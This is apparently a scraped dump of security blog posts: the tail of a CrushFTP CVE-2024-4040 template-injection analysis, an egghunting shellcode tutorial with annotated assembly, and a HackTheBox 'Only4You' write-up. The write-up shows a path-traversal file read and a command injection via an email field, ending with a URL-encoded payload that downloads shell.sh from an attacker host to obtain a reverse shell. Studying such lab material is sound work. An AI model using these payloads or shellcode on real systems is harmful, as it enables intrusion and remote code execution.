= Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_anonymous_password\u0026#34; + r2, uSG(user_info, \u0026#34;user_name\u0026#34;).equalsIgnoreCase(\u0026#34;anonymous\u0026#34;) ? uSG(user_info, \u0026#34;current_password\u0026#34;) : \u0026#34;\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_current_dir\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_current_dir\u0026#34; + r2, the_session.get_PWD()); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_site_commands_text\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_site_commands_text\u0026#34; + r2, uSG(user, \u0026#34;site\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_the_command_data\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_the_command_data\u0026#34; + r2, uSG(user_info, \u0026#34;the_command_data\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;the_command_data\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;the_command_data\u0026#34; + r2, uSG(user_info, \u0026#34;the_command_data\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_the_command\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_the_command\u0026#34; + r2, uSG(user_info, \u0026#34;the_command\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;the_command\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;the_command\u0026#34; + r2, uSG(user_info, \u0026#34;the_command\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_file_length\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_file_length\u0026#34; + r2, uSG(user_info, \u0026#34;file_length\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_overall_transfer_speed\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_overall_transfer_speed\u0026#34; + r2, uSG(user_info, \u0026#34;overall_transfer_speed\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_paused\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_paused\u0026#34; + r2, uSG(user_info, \u0026#34;paused\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_ip\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_ip\u0026#34; + r2, uSG(user_info, \u0026#34;ip\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_time_remaining\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_time_remaining\u0026#34; + r2, uSG(user_info, \u0026#34;time_remaining\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_session_upload_count\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_session_upload_count\u0026#34; + r2, uSG(user_info, \u0026#34;session_upload_count\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_session_download_count\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_session_download_count\u0026#34; + r2, uSG(user_info, \u0026#34;session_download_count\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_port_remote_ip\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_port_remote_ip\u0026#34; + r2, uSG(user_info, \u0026#34;port_remote_ip\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_port_remote_port\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_port_remote_port\u0026#34; + r2, uSG(user_info, \u0026#34;port_remote_port\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_time\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_time\u0026#34; + r2, uSG(user_info, \u0026#34;time\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_start_resume_loc\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_start_resume_loc\u0026#34; + r2, uSG(user_info, \u0026#34;start_resume_loc\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_file_transfer_mode\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_file_transfer_mode\u0026#34; + r2, uSG(user_info, \u0026#34;file_transfer_mode\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_sfv\u0026#34; + r2) \u0026gt;= 0 || in_str.indexOf(String.valueOf(r1) + \u0026#34;user_md5\u0026#34; + r2) \u0026gt;= 0) { in_str = in_str.replaceAll(\u0026#34;CRC32\u0026#34;, \u0026#34;MD5\u0026#34;); if (user_info != null) in_str = in_str.replaceAll(String.valueOf(r1) + \u0026#34;user_md5\u0026#34; + r2, user_info.getProperty(\u0026#34;md5\u0026#34;)); if (user_info != null) in_str = in_str.replaceAll(String.valueOf(r1) + \u0026#34;user_sfv\u0026#34; + r2, user_info.getProperty(\u0026#34;md5\u0026#34;)); } try { if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_time_remaining\u0026#34; + r2) \u0026gt;= 0) { String time_str = String.valueOf(uLG(user_info, \u0026#34;seconds_remaining\u0026#34;)) + \u0026#34; secs\u0026#34;; if (uLG(user_info, \u0026#34;seconds_remaining\u0026#34;) == 0L) time_str = \u0026#34;\u0026lt;None Active\u0026gt;\u0026#34;; user_info.put(\u0026#34;last_time_remaining\u0026#34;, time_str); if (uLG(user_info, \u0026#34;seconds_remaining\u0026#34;) \u0026gt; 60L) time_str = String.valueOf(uLG(user_info, \u0026#34;seconds_remaining\u0026#34;) / 60L) + \u0026#34;min, \u0026#34; + (uLG(user_info, \u0026#34;seconds_remaining\u0026#34;) - uLG(user_info, \u0026#34;seconds_remaining\u0026#34;) / 60L * 60L) + \u0026#34; secs\u0026#34;; in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_time_remaining\u0026#34; + r2, time_str); user_info.put(\u0026#34;last_time_remaining\u0026#34;, time_str); } } catch (Exception e) { in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_time_remaining\u0026#34; + r2, uSG(user_info, \u0026#34;last_time_remaining\u0026#34;)); } if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_paused\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_paused\u0026#34; + r2, uBG(user_info, \u0026#34;pause_now\u0026#34;) ? \u0026#34;!PAUSED!\u0026#34; : \u0026#34;\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_bytes_remaining\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_bytes_remaining\u0026#34; + r2, uLG(user_info, \u0026#34;file_length\u0026#34;) - uLG(user_info, \u0026#34;bytes_sent\u0026#34;) - uLG(user_info, \u0026#34;start_transfer_byte_amount\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_pasv_port\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_pasv_port\u0026#34; + r2, uIG(user_info, \u0026#34;PASV_port\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_ratio\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_ratio\u0026#34; + r2, uSG(user, \u0026#34;ratio\u0026#34;) + \u0026#34; to 1\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_perm_ratio\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_perm_ratio\u0026#34; + r2, uBG(user, \u0026#34;perm_ratio\u0026#34;) ? \u0026#34;Yes\u0026#34; : \u0026#34;No\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_reverse_ip\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_reverse_ip\u0026#34; + r2, InetAddress.getByName(uSG(user, \u0026#34;user_ip\u0026#34;)).getHostName()); r1 = \u0026#34;{\u0026#34;; r2 = \u0026#34;}\u0026#34;; } } catch (Exception e) { Log.log(\u0026#34;SERVER\u0026#34;, 2, e); } return in_str; } References: # https://nvd.nist.gov/vuln/detail/CVE-2024-4040 https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis https://github.com/airbus-cert/CVE-2024-4040 https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update https://www.rapid7.com/blog/post/2024/04/23/etr-unauthenticated-crushftp-zero-day-enables-complete-server-compromise/ https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/ ","date":"9 May 2024","permalink":"/posts/crushftp-cve-2024-4040/","section":"Posts","summary":"This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.","title":"CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis"},{"content":"","date":null,"permalink":"/tags/cve-2024-4040/","section":"Tags","summary":"","title":"Cve-2024-4040"},{"content":"","date":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"SSTI"},{"content":"","date":null,"permalink":"/categories/exploit/","section":"Categories","summary":"","title":"Exploit"},{"content":"EggHunting, if simply put, is a technique in exploit development which is used to search for a specific keyword in an application memory space to further aid in the exploit if there is a length restriction. Egg in this case refers to specific keyword/pattern and “hunter” as put you’re searching in all the accessible address space to find the pattern, hence the hunt.\nBefore we begin, we must understand the need of the egghunting technique. Consider a scenario where you are trying to exploit a buffer overflow but for some reason, you are unable to put the shellcode due to the length limitation of input (we will see this later in action). Given as an exploit developer, the end goal is always to get code execution by using any method possible.\nScenario like this is where creative thinking comes handy, let’s say you have another input field which can have your shellcode/payload but that buffer is not writing instruction pointer. Consider following example:\nInputA -\u0026gt; Large buffer but does not trigger overflow InputB -\u0026gt; This one is limited in length and triggers overflow Here, if we were able to put our payload in InputA and somehow overwrite the instruction pointer to the address of InputA during the overflow trigger via InputB we can gain shellcode execution.\nFollowing image shows it in a better way:\nThis should clear it up but there’s always a part which confuses most is the part where this comes handy. To understand it better, we will do a hands-on practical to understand it in a deeper level. This is just to understand the fundamentals of egghunting technique so that once presented with an actual exploitation of this, it will be easier to make sense out of the overall process.\nNow, we have following things cleared out:\nEgghunting is used when the buffer space is limited and we are unable to execute our shellcode directly. (Shellcode in this case refers to the one which gives us reverse shell). For example, let’s say we are able to write overwrite 1056 bytes but the EIP is being overwritten at 1000 bytes, that leaves you with just 56 bytes of space to put shellcode which will not be possible compared to the vanilla buffer overflow, hence we make use of this technique to expand our control. (Given a simple shellcode from msfvenom is of \u0026gt;300 length) This technique does not necessarily expects control over a second input field where our final shellcode will reside but it can also be on one single buffer but it depends how it parsed by the application and where the overflow is limited. Lastly, the principle of this is to search into all the address space of the memory to find an “egg” (pattern) which we have specified and once found, it pass the identified address to the instruction pointer which will then execute the stored shellcode. Analyzing the EggHunting Shellcode # There is a well known paper that explains the overall methodologies of egghunting and how it can be used, it was written by Skape. It is recommended to read it to understand two different ways the egghunting technique can be deployed but we will use the syscall technique as I prefer that and it is very simple to grasp.\nBefore we begin, I will be using the NtDisplayString syscall and the shellcode is supposed to work on Windows XP and the 0x43 is used to specify the NtDisplayString syscall. The reason we are using NtDisplayString is because as quoted by Skape himself: \u0026ldquo;The NtDisplayString system call is typically used to display text to the blue-screen that some people are (unfortunately) all too familiar with. For the purposes of an egg hunter, however, it is abused due to the fact that its only argument is a pointer that is read from and not written to, thus making it a most desirable choice.”\nIt makes sense as NtDisplayString function accepts one argument which is a pointer to memory and read the string from the memory:\nNTSYSAPI NTSTATUS NTAPI NtDisplayString( IN PUNICODE_STRING String ); It is also a good thing to note that if this function gets a memory address which for some reason is not accessible, it will throw a STATUS ACCESS VIOLATION or 0xc0000005 value.\nHere is one sample egghunting shellcode:\n0x0000000000000000: 66 81 CA FF 0F or dx, 0xfff 0x0000000000000005: 42 inc edx 0x0000000000000006: 52 push edx 0x0000000000000007: 6A 02 push 43 0x0000000000000009: 58 pop eax 0x000000000000000a: CD 2E int 0x2e 0x000000000000000c: 3C 05 cmp al, 5 0x000000000000000e: 5A pop edx 0x000000000000000f: 74 EF je 0 0x0000000000000011: B8 77 30 30 74 mov eax, 0x74303077 0x0000000000000016: 8B FA mov edi, edx 0x0000000000000018: AF scasd eax, dword ptr es:[edi] 0x0000000000000019: 75 EA jne 5 0x000000000000001b: AF scasd eax, dword ptr es:[edi] 0x000000000000001c: 75 E7 jne 5 0x000000000000001e: FF E7 jmp edi This is a classic EggHunter shellcode, assuming you know a little bit about assembly such as mov , pop and conditional jumps, there is two things that still stands out here:\nscasd : This compares dword (4 bytes value) of eax with edi and sets the appropriate flags which is used for conditional jumps int 0x2e : This instruction triggers a software interrupt, in x86 architecture the 0x2e is associated with system call. The value 0x2e is specified for system call, basically asking kernel to do some operation from user-mode. In simpler terms, there are specified syscalls a user can request kernel to perform and to do that one can use int 0x2e. There are many different syscalls that can be requested, the eax register holds an integer value which specifies the operation we are requesting. It is to be noted that the different integer values are assigned for different operation. Let’s just assume that we have taken a control of EIP and somehow made the execution our egghunting shellcode, now I will walk you through how it works, we will break it down:\n0x0000000000000000 : this line performs OR on the dx register with value of 0xfff , edx register is here to keep track of the memory address space. 0x0000000000000005 : this instruction increments the value of edx by 1. 0x00000000000000006 to 0x000000000000000a: First off, his pushes the value of edx to the stack and then pushes the value 0x43 to the stack as well, then it performs pop eax basically making the eax holds the value 0x43 which is for NtDisplayString syscall and finally it calls int 0x2e performing the syscall operation. 0x000000000000000c to 0x000000000000000f: Here, we check if the al register holds a value of 5 from the syscall result, if it does then it will pop the edx register and jump the first instruction again. By this point, it is safe to know that this is a loop where the shellcode keeps incrementing the edx value and checking if the value is equal to 5 or not, if it does keep continuing. Note that the reason we just check 5 while the returned value is 0xc0000005 is because the al is a 8 bit register and refers to low-order 8 bit of eax hence it will contain 5\n0x0000000000000011 to 0x0000000000000016 : Here, we are loading the value of our defined “egg” i.e. w00t but in little endian format (reverse order) is loaded to eax and then the edx (memroy space reference) value is moved to edi . 0x0000000000000018 to 0x0000000000000019 : Then the scasd instruction is called which is used to compare the edi and eax by default, hence it checks the value of our egg with whatever the value holds by edi ’s memory address. (remember it used [edi] which is for accessing the value stored at the memory pointed by edi ). Once the comparison is done, if the comparison fails the execution goes back to inc edx which increments page by 1 and the loop continues to check the access and then the values. 0x000000000000001b to 0x000000000000001e : This again checks the value hold by edi with our egg but is only called when the first scasd instruction found our w00t if not, it won’t even touch this piece of code but once the first scasd finds the egg, this instruction will check the next 4 bytes stored after the first identified w00t and if the comparison returns true meaning that the next w00t is found, a jmp edi instruction is called which will make the program to jump to the memory where the egg was found successfully executing our main shellcode. At this point you are wondering why we have two calls of scasd , good question. the reason being is that during the exploitation phase we write 8 bytes of pattern/egg, in this our first stage shellcode looks like:\nw00tw00t + shellcode Having a unique 8 byte egg helps in not having any false positive during the analysis of the memory for finding this very egg.\nAnother is why instead of using scasd why not go with cmp , there are few reasons for that, first is that when writing a shellcode a rule of thumb is that less bytes of shellcode and since we already making use of eax , edi registers and scasd is specifically designed to compare double words (4 bytes) and by default it checks the eax and edi which helps in achieving that because we will have less unnecessary insturctions in our shellcode. Often times, you might have to tackle with bad characters and it is very good practice to use whatever good option is there and of course, given the shellcode actually searches through the memory space, you would want the shellcode to be more efficient hence the scasd\nI hope you have understood how egghunting technique works and if required, you can now write your own egghunting shellcode or use an existing one and modify it according to your need.\nReferences: # http://undocumented.ntinternals.net/ https://j00ru.vexillium.org/syscalls/nt/32/ https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf ","date":"27 December 2023","permalink":"/posts/exploit-dev-egghunting/","section":"Posts","summary":"EggHunting, if simply put, is a technique in exploit development which is used to search for a specific keyword in an application memory space to further aid in the exploit if there is a length restriction.","title":"Exploit Dev: EggHunting Explained"},{"content":"","date":null,"permalink":"/tags/exploit-dev-egghunting/","section":"Tags","summary":"","title":"Exploit-Dev, Egghunting"},{"content":"","date":null,"permalink":"/categories/hackthebox/","section":"Categories","summary":"","title":"HackTheBox"},{"content":"Writeup for HackTheBox\u0026rsquo;s Only4You machine.\nonly4you.htb seemed like a static site with the contact functionality where we had some input fields, directory busting did not reveal anything interestin:\nDoing the vhost scan, we can see that beta.only4you.htb :\n❯ gobuster vhost -u http://only4you.htb/ -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://only4you.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/04/23 06:14:42 Starting gobuster in VHOST enumeration mode =============================================================== Found: beta.only4you.htb (Status: 200) [Size: 2191] =============================================================== 2023/04/23 06:18:25 Finished =============================================================== It seems like an image conversion/resize website and it also allow us to download source code:\nDownloading the source and analyzing the [app.py](http://app.py) :\n❯ tree . ├── beta │ ├── app.py │ ├── static │ │ └── img │ │ └── image-resize.svg │ ├── templates │ │ ├── 400.html │ │ ├── 404.html │ │ ├── 405.html │ │ ├── 500.html │ │ ├── convert.html │ │ ├── index.html │ │ ├── list.html │ │ └── resize.html │ ├── tool.py │ └── uploads │ ├── convert │ ├── list │ └── resize └── source.zip from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory import os, uuid, posixpath from werkzeug.utils import secure_filename from pathlib import Path from tool import convertjp, convertpj, resizeimg app = Flask(__name__) app.secret_key = uuid.uuid4().hex app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 1024 * 1024 app.config[\u0026#39;RESIZE_FOLDER\u0026#39;] = \u0026#39;uploads/resize\u0026#39; app.config[\u0026#39;CONVERT_FOLDER\u0026#39;] = \u0026#39;uploads/convert\u0026#39; app.config[\u0026#39;LIST_FOLDER\u0026#39;] = \u0026#39;uploads/list\u0026#39; app.config[\u0026#39;UPLOAD_EXTENSIONS\u0026#39;] = [\u0026#39;.jpg\u0026#39;, \u0026#39;.png\u0026#39;] @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def main(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/resize\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def resize(): if request.method == \u0026#39;POST\u0026#39;: if \u0026#39;file\u0026#39; not in request.files: flash(\u0026#39;Something went wrong, Try again!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) file = request.files[\u0026#39;file\u0026#39;] img = secure_filename(file.filename) if img != \u0026#39;\u0026#39;: ext = os.path.splitext(img)[1] if ext not in app.config[\u0026#39;UPLOAD_EXTENSIONS\u0026#39;]: flash(\u0026#39;Only png and jpg images are allowed!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) file.save(os.path.join(app.config[\u0026#39;RESIZE_FOLDER\u0026#39;], img)) status = resizeimg(img) if status == False: flash(\u0026#39;Image is too small! Minimum size needs to be 700x700\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) else: flash(\u0026#39;Image is succesfully uploaded!\u0026#39;, \u0026#39;success\u0026#39;) else: flash(\u0026#39;No image selected!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) return render_template(\u0026#39;resize.html\u0026#39;, clicked=\u0026#34;True\u0026#34;), {\u0026#34;Refresh\u0026#34;: \u0026#34;5; url=/list\u0026#34;} else: return render_template(\u0026#39;resize.html\u0026#39;, clicked=\u0026#34;False\u0026#34;) @app.route(\u0026#39;/convert\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def convert(): if request.method == \u0026#39;POST\u0026#39;: if \u0026#39;file\u0026#39; not in request.files: flash(\u0026#39;Something went wrong, Try again!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) file = request.files[\u0026#39;file\u0026#39;] img = secure_filename(file.filename) if img != \u0026#39;\u0026#39;: ext = os.path.splitext(img)[1] if ext not in app.config[\u0026#39;UPLOAD_EXTENSIONS\u0026#39;]: flash(\u0026#39;Only jpg and png images are allowed!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) file.save(os.path.join(app.config[\u0026#39;CONVERT_FOLDER\u0026#39;], img)) if ext == \u0026#39;.png\u0026#39;: image = convertpj(img) return send_from_directory(app.config[\u0026#39;CONVERT_FOLDER\u0026#39;], image, as_attachment=True) else: image = convertjp(img) return send_from_directory(app.config[\u0026#39;CONVERT_FOLDER\u0026#39;], image, as_attachment=True) else: flash(\u0026#39;No image selected!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(request.url) return render_template(\u0026#39;convert.html\u0026#39;) else: [f.unlink() for f in Path(app.config[\u0026#39;CONVERT_FOLDER\u0026#39;]).glob(\u0026#34;*\u0026#34;) if f.is_file()] return render_template(\u0026#39;convert.html\u0026#39;) @app.route(\u0026#39;/source\u0026#39;) def send_report(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;source.zip\u0026#39;, as_attachment=True) @app.route(\u0026#39;/list\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def list(): return render_template(\u0026#39;list.html\u0026#39;) @app.route(\u0026#39;/download\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def download(): image = request.form[\u0026#39;image\u0026#39;] filename = posixpath.normpath(image) if \u0026#39;..\u0026#39; in filename or filename.startswith(\u0026#39;../\u0026#39;): flash(\u0026#39;Hacking detected!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) if not os.path.isabs(filename): filename = os.path.join(app.config[\u0026#39;LIST_FOLDER\u0026#39;], filename) try: if not os.path.isfile(filename): flash(\u0026#39;Image doesn\\\u0026#39;t exist!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) except (TypeError, ValueError): raise BadRequest() return send_file(filename, as_attachment=True) @app.errorhandler(404) def page_not_found(error): return render_template(\u0026#39;404.html\u0026#39;), 404 @app.errorhandler(500) def server_error(error): return render_template(\u0026#39;500.html\u0026#39;), 500 @app.errorhandler(400) def bad_request(error): return render_template(\u0026#39;400.html\u0026#39;), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template(\u0026#39;405.html\u0026#39;), 405 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=80, debug=False) We see that it has a download endpoint where it checks basic things for LFI like ../ characters and also checks if the given path is not absolute, check from the application’s upload directory but if the given path is absolute, then proceed to provide the file in the response. This can be taken into our advantage as we can specify the absolute path of any arbitrary file on the system and retrieve the contents of it, from example giving ../../../../.../../etc/paswd will result in failure as it won’t pass the filter check but giving /etc/passwd which is the absolute path, the application will return the file contents.\nFrom the further investigation, nothing interesting was found, since we know that there is the main website running, I checked the error.log for the nginx and it showed the directory path for the main site:\nI grabbed that [app.py](http://app.py) from the only4you.htb directory from the /var/www/\nfrom flask import Flask, render_template, request, flash, redirect from form import sendmessage import uuid app = Flask(__name__) app.secret_key = uuid.uuid4().hex @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;POST\u0026#39;: email = request.form[\u0026#39;email\u0026#39;] subject = request.form[\u0026#39;subject\u0026#39;] message = request.form[\u0026#39;message\u0026#39;] ip = request.remote_addr status = sendmessage(email, subject, message, ip) if status == 0: flash(\u0026#39;Something went wrong!\u0026#39;, \u0026#39;danger\u0026#39;) elif status == 1: flash(\u0026#39;You are not authorized!\u0026#39;, \u0026#39;danger\u0026#39;) else: flash(\u0026#39;Your message was successfuly sent! We will reply as soon as possible.\u0026#39;, \u0026#39;success\u0026#39;) return redirect(\u0026#39;/#contact\u0026#39;) else: return render_template(\u0026#39;index.html\u0026#39;) @app.errorhandler(404) def page_not_found(error): return render_template(\u0026#39;404.html\u0026#39;), 404 @app.errorhandler(500) def server_errorerror(error): return render_template(\u0026#39;500.html\u0026#39;), 500 @app.errorhandler(400) def bad_request(error): return render_template(\u0026#39;400.html\u0026#39;), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template(\u0026#39;405.html\u0026#39;), 405 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=80, debug=False) From the first glance the code had nothing interesting accept form module which was being imported, checking the [form.py](http://form.py) :\nimport smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): return 0 else: domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;v=spf1\u0026#34; not in output: return 1 else: domains = [] ips = [] if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) dms.pop(0) for domain in dms: domains.append(domain) while True: for domain in domains: result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) domains.clear() for domain in dms: domains.append(domain) elif \u0026#34;ip4:\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: pass break elif \u0026#34;ip4\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: return 1 for i in ips: if ip == i: return 2 elif ipaddress.ip_address(ip) in ipaddress.ip_network(i): return 2 else: return 1 def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg[\u0026#39;From\u0026#39;] = f\u0026#39;{email}\u0026#39; msg[\u0026#39;To\u0026#39;] = \u0026#39;info@only4you.htb\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#39;{subject}\u0026#39; msg[\u0026#39;Message\u0026#39;] = f\u0026#39;{message}\u0026#39; smtp = smtplib.SMTP(host=\u0026#39;localhost\u0026#39;, port=25) smtp.send_message(msg) smtp.quit() return status elif status == 1: return status else: return status This script performs the pattern to check for the email address then split it in two half and check the address of the domain by calling dig via [subprocess.run](http://subprocess.run)\n#!/usr/bin/python3 from subprocess import run,PIPE import re email = \u0026#34;hello@gmail.com;id\u0026#34; if not re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): print(\u0026#34;Nope, try again\u0026#34;) else: domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) print(output) Though the regex was used to check if the pattern matches the email then the second half was passed to the dig command, what we can do here is provide a valid mail and after that add a semicolon in the address, since re.match is used, once the pattern will be found it will return True\nAs we can see that ;id was given at the end of the mail address and is executed. Next, we can try the same payload on the website, here we can just provide the wget command to confirm if it is working and it made the connection to local HTTP Server:\n❯ sudo python3 -m http.server 80 --bind 10.10.14.22 [sudo] password for kali: Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ... 10.10.11.210 - - [23/Apr/2023 07:25:03] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Now, we just download the [shel.sh](http://shel.sh) file containing the reverse shell payload and then executing it with the next request with bash /tmp/shell.sh\nname=robin\u0026amp;email=robin%40only4you%2Ehtb%3Bwget%20http%3A%2F%2F10%2E10%2E14%2E22%2Fshell%2Esh%20%2DO%20%2Ftmp%2Fshell%2Esh\u0026amp;subject=nothing\u0026amp;message=al 